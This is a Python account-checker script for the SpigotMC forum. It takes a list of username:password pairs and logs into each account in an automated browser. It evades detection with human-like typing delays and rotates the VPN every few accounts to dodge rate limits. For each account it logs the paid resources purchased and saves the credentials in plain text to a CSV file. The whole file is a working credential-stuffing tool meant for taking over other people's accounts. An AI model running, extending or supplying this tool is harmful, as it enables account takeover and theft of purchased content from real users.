#!/usr/bin/env python3
"""
SpigotMC Account Scanner (English version)
Basic tool to scan purchased resources on SpigotMC accounts.
Uses undetected-chromedriver to reduce automation detection.
"""

import time
import csv
import subprocess
import platform
import re
import sys
import os
from datetime import datetime
from urllib.parse import urljoin
import undetected_chromedriver as uc

# Apply a safe global patch to the Chrome destructor to avoid OSError on Windows
try:
    ChromeClass = uc.Chrome
    if not getattr(ChromeClass, '_copilot_original_del_global', None):
        orig_del_glob = getattr(ChromeClass, '__del__', None)
        setattr(ChromeClass, '_copilot_original_del_global', orig_del_glob)
        def _safe_del_global(self):
            try:
                if orig_del_glob:
                    orig_del_glob(self)
            except OSError:
                # ignore WinError 6 invalid handle
                pass
            except Exception:
                pass
        setattr(ChromeClass, '__del__', _safe_del_global)
except Exception:
    pass

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementNotInteractableException
from selenium.common.exceptions import SessionNotCreatedException

class SpigotScanner:
    def __init__(self):
        self.driver = None
        self.results = []
        # VPN rotation settings
        # If set, vpn_commands can be a list of shell commands or a path to a file with one command per line.
        self.vpn_commands = []
        self.vpn_index = 0
        self.vpn_interval = 5  # default: rotate every 5 accounts
        self._accounts_processed = 0
        # Typing / timing settings to slow down automated login
        self.human_typing = True
        self.min_char_delay = 0.05  # seconds between keystrokes
        self.max_char_delay = 0.18
        self.post_field_delay = 0.4  # seconds after filling a field
        self.pre_submit_delay = 0.6

    def setup_driver(self):
        """Configure undetected-chromedriver and try to match Chrome version."""
        options = uc.ChromeOptions()
        try:
            options.add_argument('--disable-gpu')
            options.add_argument('--start-maximized')
        except Exception:
            pass

        def _get_chrome_major_version():
            if platform.system() == 'Windows':
                try:
                    import winreg
                    for hive in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
                        try:
                            key = winreg.OpenKey(hive, r"SOFTWARE\Google\Chrome\BLBeacon")
                            ver, _ = winreg.QueryValueEx(key, 'version')
                            if ver:
                                m = re.match(r"(\d+)", ver)
                                if m:
                                    return m.group(1)
                        except Exception:
                            continue
                except Exception:
                    pass

            common_paths = []
            if platform.system() == 'Windows':
                common_paths = [
                    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                ]
            else:
                common_paths = ["google-chrome", "chrome", "chromium-browser", "chromium"]

            for p in common_paths:
                try:
                    output = subprocess.check_output([p, '--version'], stderr=subprocess.STDOUT)
                    output = output.decode(errors='ignore')
                    m = re.search(r"(\d+)\.", output)
                    if m:
                        return m.group(1)
                except Exception:
                    continue

            try:
                output = subprocess.check_output(['chrome', '--version'], stderr=subprocess.STDOUT)
                output = output.decode(errors='ignore')
                m = re.search(r"(\d+)\.", output)
                if m:
                    return m.group(1)
            except Exception:
                pass

            return None

        version_main = _get_chrome_major_version()
        version_main_int = None

        if version_main:
            print(f"🔎 Detected Chrome major version: {version_main}")
            try:
                version_main_int = int(version_main)
            except Exception:
                version_main_int = None
        else:
            print("⚠️ Could not detect Chrome version. Trying without version_main...")

        try:
            if version_main_int is not None:
                self.driver = uc.Chrome(options=options, version_main=version_main_int)
            else:
                self.driver = uc.Chrome(options=options)
        except Exception as e_initial:
            err_text = str(e_initial)
            if 'unrecognized chrome option' in err_text or 'cannot parse capability: goog:chromeOptions' in err_text:
                try:
                    print('⚠️ Chrome options rejected by chromedriver; retrying with minimal options...')
                    minimal_opts = uc.ChromeOptions()
                    if version_main_int is not None:
                        self.driver = uc.Chrome(options=minimal_opts, version_main=version_main_int)
                    else:
                        self.driver = uc.Chrome(options=minimal_opts)
                except Exception:
                    raise
            else:
                raise

            try:
                cls = self.driver.__class__
                if not getattr(cls, '_copilot_original_del', None):
                    orig_del = getattr(cls, '__del__', None)
                    setattr(cls, '_copilot_original_del', orig_del)
                    def _safe_del(self):
                        try:
                            if orig_del:
                                orig_del(self)
                        except OSError:
                            pass
                        except Exception:
                            pass
                    setattr(cls, '__del__', _safe_del)
            except Exception:
                pass
        except SessionNotCreatedException as e:
            print("❌ Chrome/ChromeDriver version mismatch.")
            print("Detail:", e)
            print("Suggestions: update Chrome or undetected-chromedriver (pip install -U undetected-chromedriver)")
            raise
        except Exception as e:
            print(f"❌ Unexpected error starting driver: {e}")
            raise

    def ensure_admin(self):
        """If running on Windows and not elevated, try to relaunch the current script as administrator.
        This uses ShellExecute 'runas' which triggers UAC. If the user accepts, the current process will exit
        after launching the elevated process.
        """
        try:
            if platform.system() != 'Windows':
                return True
            try:
                import ctypes
                is_admin = False
                try:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                except Exception:
                    is_admin = False
                if is_admin:
                    return True
                # Not admin: relaunch with elevation
                python_exe = sys.executable
                # Reconstruct command line for current script
                args = ' '.join([f'"{a}"' for a in sys.argv])
                # Use ShellExecuteW to run as administrator
                try:
                    params = ' '.join([f'"{a}"' for a in sys.argv[1:]])
                    ctypes.windll.shell32.ShellExecuteW(None, 'runas', python_exe, params, None, 1)
                    print('🔼 Relaunching elevated process (UAC prompt will appear). Exiting current process.')
                    sys.exit(0)
                except Exception as e:
                    print(f"⚠️ Could not relaunch elevated: {e}")
                    return False
            except Exception:
                return False
        except Exception:
            return False

    def load_vpn_commands_from_file(self, path):
        try:
            cmds = []
            with open(path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        cmds.append(line)
            self.vpn_commands = cmds
            self.vpn_index = 0
            return True
        except Exception as e:
            print(f"⚠️ Could not load VPN commands from {path}: {e}")
            return False

    def _maybe_rotate_vpn(self):
        # Run next VPN command every self.vpn_interval accounts processed
        try:
            if not self.vpn_commands:
                return
            if self.vpn_interval <= 0:
                return
            if self._accounts_processed > 0 and (self._accounts_processed % self.vpn_interval) == 0:
                cmd = self.vpn_commands[self.vpn_index % len(self.vpn_commands)]
                print(f"🔁 Rotating VPN (running command #{self.vpn_index}): {cmd}")
                try:
                    # On Windows, run via powershell; keep shell=False and pass list for safety
                    if platform.system() == 'Windows':
                        subprocess.run(["powershell", "-Command", cmd], check=False)
                    else:
                        subprocess.run(cmd, shell=True, check=False)
                except Exception as e:
                    print(f"⚠️ VPN command failed: {e}")
                self.vpn_index += 1
        except Exception:
            pass

    def login(self, username, password):
        """Perform login to SpigotMC; always go to /login, never /register. Waits for manual CAPTCHA resolution if necessary."""
        try:
            print(f"🔐 Logging in: {username}")
            # Always go to login, never register
            self.driver.get("https://www.spigotmc.org/login/")
            # If redirected to /register, go back to /login
            if "/register" in self.driver.current_url:
                print("⚠️ Redirected to register page, returning to login...")
                self.driver.get("https://www.spigotmc.org/login/")
            wait = WebDriverWait(self.driver, 15)

            def _find_field(candidates, short_timeout=10):
                end = time.time() + short_timeout
                for loc in candidates:
                    while time.time() < end:
                        try:
                            elems = self.driver.find_elements(*loc)
                        except Exception:
                            # locator might be (By.CSS_SELECTOR, "input[type='text']") style
                            try:
                                elems = self.driver.find_elements(loc[0], loc[1])
                            except Exception:
                                elems = []
                        for el in elems:
                            try:
                                if el.is_displayed() and el.is_enabled():
                                    return el
                            except Exception:
                                continue
                        time.sleep(0.3)
                return None

            username_candidates = [
                (By.NAME, 'login'),
                (By.NAME, 'username'),
                (By.ID, 'username'),
                (By.CSS_SELECTOR, "input[type='email']"),
                (By.CSS_SELECTOR, "input[type='text']"),
            ]
            password_candidates = [
                (By.NAME, 'password'),
                (By.ID, 'password'),
                (By.CSS_SELECTOR, "input[type='password']"),
            ]

            username_field = _find_field(username_candidates, short_timeout=10)
            password_field = _find_field(password_candidates, short_timeout=10)

            if username_field is None or password_field is None:
                try:
                    form = self.driver.find_element(By.ID, 'pageLogin')
                    try:
                        if username_field is None:
                            username_field = form.find_element(By.CSS_SELECTOR, "input[name='login'], input[type='email'], input[type='text']")
                    except Exception:
                        pass
                    try:
                        if password_field is None:
                            password_field = form.find_element(By.CSS_SELECTOR, "input[type='password']")
                    except Exception:
                        pass
                except Exception:
                    try:
                        if username_field is None:
                            username_field = self.driver.find_element(By.CSS_SELECTOR, "input[type='email'], input[type='text']")
                        if password_field is None:
                            password_field = self.driver.find_element(By.CSS_SELECTOR, "input[type='password']")
                    except Exception:
                        pass

            if username_field is None or password_field is None:
                raise TimeoutException('Could not find username/password fields (multiple fallbacks tried)')

            # helper to attempt robust typing into inputs
            def _hide_overlays():
                try:
                    self.driver.execute_script("document.querySelectorAll('.modal, .overlay, .fancybox-overlay, .popup, .lightbox').forEach(e=>e.style.display='none');")
                except Exception:
                    pass

            def _send_keys_safe(el, text):
                try:
                    _hide_overlays()
                    # scroll into view and try click to focus
                    try:
                        self.driver.execute_script('arguments[0].scrollIntoView(true);', el)
                    except Exception:
                        pass
                    try:
                        el.click()
                    except Exception:
                        pass
                    try:
                        el.clear()
                    except Exception:
                        pass
                    try:
                        if self.human_typing and isinstance(text, str):
                            # type character by character with small random delays
                            import random
                            for ch in text:
                                try:
                                    el.send_keys(ch)
                                except Exception:
                                    try:
                                        self.driver.execute_script("arguments[0].value += arguments[1]; arguments[0].dispatchEvent(new Event('input'));", el, ch)
                                    except Exception:
                                        pass
                                time.sleep(random.uniform(self.min_char_delay, self.max_char_delay))
                        else:
                            el.send_keys(text)
                        try:
                            time.sleep(self.post_field_delay)
                        except Exception:
                            pass
                        return True
                    except ElementNotInteractableException:
                        # fallback: set value via JS
                        try:
                            self.driver.execute_script("arguments[0].value = arguments[1]; arguments[0].dispatchEvent(new Event('input'));", el, text)
                            return True
                        except Exception:
                            return False
                    except Exception:
                        # last resort: set via JS
                        try:
                            self.driver.execute_script("arguments[0].value = arguments[1]; arguments[0].dispatchEvent(new Event('input'));", el, text)
                            return True
                        except Exception:
                            return False
                except Exception:
                    return False

            username_ok = _send_keys_safe(username_field, username)
            password_ok = _send_keys_safe(password_field, password)
            if not username_ok or not password_ok:
                # try focusing via JS and retry
                try:
                    self.driver.execute_script("arguments[0].focus();", username_field)
                except Exception:
                    pass
                try:
                    self.driver.execute_script("arguments[0].focus();", password_field)
                except Exception:
                    pass

            submitted = False
            try:
                # Prefer submitting the button that lives inside the login form
                login_keywords = re.compile(r"log[\s_-]*in|sign[\s_-]*in|iniciar|entrar", re.I)

                def _find_login_button_in_form(form):
                    try:
                        candidates = form.find_elements(By.XPATH, ".//input[@type='submit' or @type='button' or @type='image'] | .//button")
                    except Exception:
                        candidates = []
                    for c in candidates:
                        try:
                            if not c.is_displayed():
                                continue
                            txt = (c.get_attribute('value') or '') + ' ' + (c.text or '')
                            if login_keywords.search(txt):
                                return c
                        except Exception:
                            continue
                    # fallback: first visible candidate
                    for c in candidates:
                        try:
                            if c.is_displayed():
                                return c
                        except Exception:
                            continue
                    return None

                btn = None
                if 'login_form' in locals() and login_form is not None:
                    btn = _find_login_button_in_form(login_form)

                if not btn:
                    # look for a suitable form on the page that appears to be the login form
                    try:
                        forms = self.driver.find_elements(By.TAG_NAME, 'form')
                        for f in forms:
                            try:
                                candidate = _find_login_button_in_form(f)
                                if candidate:
                                    # prefer forms whose action contains 'login'
                                    action = (f.get_attribute('action') or '')
                                    if 'login' in action.lower() or login_keywords.search(candidate.get_attribute('value') or '') or login_keywords.search(candidate.text or ''):
                                        login_form = f
                                        btn = candidate
                                        break
                            except Exception:
                                continue
                    except Exception:
                        pass

                if btn:
                    try:
                        self.driver.execute_script('arguments[0].scrollIntoView(true);', btn)
                    except Exception:
                        pass
                    try:
                        btn.click()
                        submitted = True
                    except Exception:
                        try:
                            self.driver.execute_script('arguments[0].click();', btn)
                            submitted = True
                        except Exception:
                            submitted = False

                if not submitted:
                    try:
                        # Find the form element that encloses the username/password inputs
                        login_form = None
                        try:
                            login_form = username_field.find_element(By.XPATH, './ancestor::form')
                        except Exception:
                            try:
                                login_form = password_field.find_element(By.XPATH, './ancestor::form')
                            except Exception:
                                login_form = None

                        if not login_form:
                            # fallback to #pageLogin or any visible form on the page
                            try:
                                login_form = self.driver.find_element(By.ID, 'pageLogin')
                            except Exception:
                                try:
                                    forms = self.driver.find_elements(By.TAG_NAME, 'form')
                                    for f in forms:
                                        try:
                                            if f.is_displayed():
                                                login_form = f
                                                break
                                        except Exception:
                                            continue
                                except Exception:
                                    login_form = None

                        if login_form:
                            try:
                                _hide_overlays()
                                # submit the specific login form to avoid register buttons
                                self.driver.execute_script('arguments[0].submit();', login_form)
                                submitted = True
                            except Exception:
                                submitted = False
                        else:
                            submitted = False
                    except Exception:
                        submitted = False
                if not submitted:
                    try:
                        password_field.send_keys('\n')
                        submitted = True
                    except Exception:
                        submitted = False
                if not submitted:
                    raise NoSuchElementException('Could not submit login form (no valid button)')
            except NoSuchElementException:
                raise

            time.sleep(3)

            # After submission, ensure we didn't get redirected to a registration page
            try:
                cur = (self.driver.current_url or '').lower()
                if '/register' in cur or '/login/login' in cur or cur.rstrip('/').endswith('/login/login'):
                    # save diagnostics and treat as failure
                    try:
                        os.makedirs('debug_screens', exist_ok=True)
                        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                        safe_user = re.sub(r"[^a-zA-Z0-9_-]", '_', username)[:40]
                        png = os.path.join('debug_screens', f'{safe_user}_redirect_{ts}.png')
                        html = os.path.join('debug_screens', f'{safe_user}_redirect_{ts}.html')
                        try:
                            self.driver.save_screenshot(png)
                        except Exception:
                            pass
                        try:
                            with open(html, 'w', encoding='utf-8') as f:
                                f.write(self.driver.page_source)
                        except Exception:
                            pass
                        print(f"❌ After submit we were redirected to registration-like page ({cur}). Saved: {png}, {html}")
                    except Exception:
                        print(f"❌ After submit we were redirected to registration-like page ({cur}).")
                    return False
            except Exception:
                pass

            try:
                captcha_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[src*='hcaptcha'], iframe[src*='recaptcha']")
                if captcha_iframe.is_displayed():
                    print("⚠️ CAPTCHA detected. Please solve it manually in the browser window.")
                    max_wait = 300
                    poll_interval = 5
                    waited = 0
                    while waited < max_wait:
                        time.sleep(poll_interval)
                        waited += poll_interval
                        try:
                            if not captcha_iframe.is_displayed():
                                print("✅ CAPTCHA solved, continuing...")
                                break
                        except Exception:
                            print("✅ CAPTCHA likely solved (iframe not available)")
                            break
                        if "login" not in self.driver.current_url:
                            print("✅ Page changed, login may be successful.")
                            break
                    else:
                        print("❌ CAPTCHA wait timed out.")
                        return False
            except NoSuchElementException:
                pass

            if "login" in self.driver.current_url:
                print(f"❌ Login failed for {username}")
                return False

            print(f"✅ Login successful for: {username}")
            return True

        except Exception as e:
            try:
                os.makedirs('debug_screens', exist_ok=True)
                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                safe_user = re.sub(r"[^a-zA-Z0-9_-]", '_', username)[:40]
                png = os.path.join('debug_screens', f'{safe_user}_{ts}.png')
                html = os.path.join('debug_screens', f'{safe_user}_{ts}.html')
                try:
                    self.driver.save_screenshot(png)
                except Exception:
                    pass
                try:
                    with open(html, 'w', encoding='utf-8') as f:
                        f.write(self.driver.page_source)
                except Exception:
                    pass
                print(f"❌ Login error: {e} (screenshot: {png}, html: {html})")
            except Exception:
                print(f"❌ Login error: {e}")
            return False

    def get_purchased_plugins(self):
        """Get list of purchased resources (only paid, from /resources/purchased)."""
        try:
            print("📦 Retrieving purchased resources...")

            purchased_url = "https://www.spigotmc.org/resources/purchased"
            try:
                self.driver.get(purchased_url)
            except Exception:
                print("⚠️ Could not load purchased resources page.")
                return []

            time.sleep(3)

            plugins = []
            resource_href_re = re.compile(r"/?resources/[^/]+\.\d+/?")
            seen = set()

            # Only extract resources from the purchased list (li.resourceListItem)
            try:
                items = self.driver.find_elements(By.XPATH, "//li[contains(@class,'resourceListItem')]")
                for li in items:
                    try:
                        lid = li.get_attribute('id') or ''
                        m = re.search(r'resource-(\d+)', lid)
                        res_id = m.group(1) if m else None
                        # Check for a price or paid indicator (e.g. no 'Free' badge)
                        is_free = False
                        try:
                            badge = li.find_element(By.XPATH, ".//*[contains(@class,'badge') and contains(text(),'Free')]")
                            if badge:
                                is_free = True
                        except Exception:
                            pass
                        if is_free:
                            continue
                        a = li.find_element(By.XPATH, ".//h3[contains(@class,'title')]//a")
                        href = a.get_attribute('href') or ''
                        href = urljoin('https://www.spigotmc.org/', href)
                        title = (a.text or '').strip() or ''
                        if not href or not resource_href_re.search(href):
                            continue
                        key = res_id or href
                        if key in seen:
                            continue
                        seen.add(key)
                        plugins.append(f"{title} | {href}")
                    except Exception:
                        continue
            except Exception:
                pass

            if not plugins:
                try:
                    os.makedirs('debug_screens', exist_ok=True)
                    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                    html = os.path.join('debug_screens', f'purchased_page_{ts}.html')
                    with open(html, 'w', encoding='utf-8') as f:
                        f.write(self.driver.page_source)
                    print(f"⚠️ No purchased resources found. Saved HTML: {html}")
                except Exception:
                    pass

            return plugins
        except Exception as e:
            print(f"❌ Error retrieving purchased resources: {e}")
            return []

    def logout(self):
        """Try to log out cleanly; otherwise clear cookies and go to home."""
        try:
            try:
                logout_links = [
                    "//a[contains(@href, 'logout')]",
                    "//a[contains(text(), 'Log out')]",
                    "//a[contains(text(), 'Logout')]",
                ]
                for sel in logout_links:
                    try:
                        el = self.driver.find_element(By.XPATH, sel)
                        el.click()
                        time.sleep(1)
                        return True
                    except Exception:
                        continue
            except Exception:
                pass

            try:
                self.driver.delete_all_cookies()
            except Exception:
                pass
            try:
                self.driver.get('https://www.spigotmc.org/')
            except Exception:
                pass
            return True
        except Exception:
            return False

    def process_account(self, username, password):
        try:
            if self.login(username, password):
                plugins = self.get_purchased_plugins()
                result = {
                    'username': username,
                    'password': password,
                    'plugins': ",".join(plugins),
                    'plugin_count': len(plugins),
                    'status': 'success'
                }
                if len(plugins) == 0:
                    try:
                        self.logout()
                    except Exception:
                        pass
            else:
                result = {
                    'username': username,
                    'password': password,
                    'plugins': "",
                    'plugin_count': 0,
                    'status': 'login_failed'
                }
                try:
                    self.logout()
                except Exception:
                    pass

            self.results.append(result)
            return result
        except Exception as e:
            print(f"❌ Error processing account {username}: {e}")
            error_result = {
                'username': username,
                'password': password,
                'plugins': "",
                'plugin_count': 0,
                'status': 'error'
            }
            try:
                self.logout()
            except Exception:
                pass
            self.results.append(error_result)
            return error_result

    def read_accounts_file(self, filename="accounts.txt"):
        accounts = []
        try:
            with open(filename, 'r', encoding='utf-8') as file:
                for line in file:
                    line = line.strip()
                    if line and ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            username, password = parts
                            accounts.append((username.strip(), password.strip()))
            return accounts
        except FileNotFoundError:
            print(f"❌ File {filename} not found")
            return []
        except Exception as e:
            print(f"❌ Error reading accounts file: {e}")
            return []

    def save_results(self, filename="results.csv"):
        try:
            with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
                fieldnames = ['username', 'password', 'plugin_count', 'plugins', 'status']
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
                for result in self.results:
                    writer.writerow(result)
            print(f"💾 Results saved to: {filename}")
        except Exception as e:
            print(f"❌ Error saving results: {e}")

    def display_results(self):
        print("\n" + "="*60)
        print("📊 SCAN RESULTS")
        print("="*60)
        for result in self.results:
            print(f"\n👤 User: {result['username']}")
            print(f"🔑 Password: {result['password']}")
            print(f"📦 Plugins found: {result['plugin_count']}")
            print(f"✅ Status: {result['status']}")
            if result['plugins']:
                print("🛒 Purchased resources:")
                for plugin in result['plugins'].split(','):
                    print(f"   • {plugin}")
            print("-" * 40)

    def run(self):
        print("🚀 Starting SpigotMC account scanner")
        print("="*60)
        accounts = self.read_accounts_file()
        if not accounts:
            print("❌ No accounts to process")
            return
        print(f"📋 Accounts found: {len(accounts)}")
        # If a vpn_commands.txt file exists in the working directory, load it
        try:
            if os.path.exists('vpn_commands.txt'):
                loaded = self.load_vpn_commands_from_file('vpn_commands.txt')
                if loaded:
                    print(f"🔒 Loaded VPN commands ({len(self.vpn_commands)} entries). Rotating every {self.vpn_interval} accounts.")
        except Exception:
            pass

        self.setup_driver()
        try:
            for i, (username, password) in enumerate(accounts, 1):
                try:
                    print(f"\n🔍 Processing account {i}/{len(accounts)}")
                    self.process_account(username, password)
                    # increment processed counter and maybe rotate VPN
                    try:
                        self._accounts_processed += 1
                    except Exception:
                        self._accounts_processed = 0
                    try:
                        self._maybe_rotate_vpn()
                    except Exception:
                        pass
                    time.sleep(2)
                except KeyboardInterrupt:
                    print('\n⏸️ Execution interrupted by user. Saving progress...')
                    break
        finally:
            try:
                if self.driver:
                    try:
                        self.driver.quit()
                    except Exception:
                        pass
                    try:
                        del self.driver
                    except Exception:
                        self.driver = None
            except Exception:
                pass
            self.display_results()
            self.save_results()


def main():
    scanner = SpigotScanner()
    scanner.run()

if __name__ == "__main__":
    main()
